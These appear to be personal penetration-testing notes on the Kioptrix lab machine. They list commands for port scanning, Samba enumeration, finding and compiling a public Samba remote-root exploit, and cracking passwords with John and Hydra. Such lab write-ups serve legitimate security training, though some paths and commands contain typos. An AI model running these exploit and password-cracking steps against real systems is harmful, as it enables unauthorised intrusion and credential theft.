---

keywords: nmap,kioptrix,unicornscan,smbclient,searchsploit,atftpd,netstat,nc, john_password,xhydra,thc_hydra,atftpd

---

[T1]

## Kioptrix

to make a vulnerability environment for testing.

### Steps for attacking

- [1] scanning

```bash
nmap -f -n -P0 -v -p- -T4 ip
```

### Fetch details of opend ports

```bash
# For udp ports
unicornscan -mT -r500 -I ip
```

### Detection of version of sw & opened ports

```bash
nmap -n -sTUV -pT:ports,U:ip1 ip2
```

### Gathering signals

#### nc

```bash
# connect to port 80
nc ip 80
```

#### ncat

```bash
# gather http signs
ncat ip
```
### smbclient

```bash
# connect to a fantastic port 139 
smbclient - ip -N
# L means I do not have a password
smbclient -L ip -N
```

Output Samba 2.2.1a. Now we are set to find vulnerabilities folowed version.

- [Exploit-DB](www.exploit-db.com)

Searching keyword Samba and port 139. [[exploit_remote]]

```bash
./searchsploit samba
# reports:
# samba 2.2.8 Remote Root Exploit -sambal.c
# /linux/remote/10.c
cp /pentest/exploits/exploitdb/platforms/linux/remote/10.c /root/10.c
# after review we must compile the file
nano 10.c
# q:
gcc 10.c -o SambaVuln10
# Compile the code:
./SambaVuln10
./SambaVuln10 -v -d0 -S ip
./SambaVuln10 -b0 -v ip
```
### After entered to remote sys

```bash
whoami
hostname
lastlog
```

Some clients have TFTP service. So, we can connect to them.

```bash
atftpd --daemon --port 69 --bind-address ip /tmp
netstat -anu | grep 69
```

Eventually, install pure-ftp on BackTrack OS. create a connection from BT OS to Kioptrix OS.
Finally:

```bash
cd /pentest/passwords/john
john /var/public/shadow
```

After coennect to the kioptrix We will use #THC_Hydra to hack passwords.

```bash
./SambaVuln_10 -b 0 ip
```

Alternatively we can use #Xhydra GUI to attack a machine with Port 22. protocol aftp. For now we can add showed password to BackTrack file: `passwords/wordlists/darkc0de.lst` in path of `/oentest/passwprds/wordlists`

Alternatively we can use Metasploit to save in database.

```bash
msfupdate
msfconsole
```